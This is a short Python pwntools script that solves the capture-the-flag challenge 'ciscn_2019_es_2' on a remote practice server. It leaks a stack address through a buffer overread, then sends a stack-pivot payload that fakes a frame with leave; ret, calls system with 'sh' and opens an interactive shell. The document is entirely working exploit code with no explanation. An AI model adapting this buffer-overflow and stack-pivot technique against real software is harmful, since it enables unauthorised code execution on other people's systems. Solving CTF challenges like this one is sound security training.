#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './ciscn_2019_es_2'
e = ELF(filename)
# p = process(filename)
p = remote("node3.buuoj.cn", 27104)

log.level = 'DEBUG'
for k, v in e.got.items():
    log.debug(f'got:{k}={hex(v)}')

p.recvuntil(b"\n")

ra_offset = 0x28
leaked_offset = 0x50
call_system = 0x08048559
leave_ret = 0x080485fd
payload_leak_mem = b'0'*0x20


p.sendline(payload_leak_mem)
p.recvuntil(payload_leak_mem)
leaked_addr = u32(p.recv(6*4)[-4:])
buffer_addr = leaked_addr - leaked_offset
log.success(f'leaked={hex(leaked_addr)}, buffer={hex(buffer_addr)}')

# TODO HINT
# Frame faking
pivot = b'sh\x00'
payload = p32(buffer_addr) + p32(call_system) + p32(buffer_addr+0xc) + pivot + b'1'*(ra_offset - len(pivot) - 0xc) + p32(buffer_addr) + p32(leave_ret)
# payload = p32(leave_ret) + p32(call_system) + p32(buffer_addr+0xc) + pivot + b'1'*(ra_offset - len(pivot) - 0xc) + p32(buffer_addr) + p32(leave_ret)
p.sendline(payload)
p.interactive()
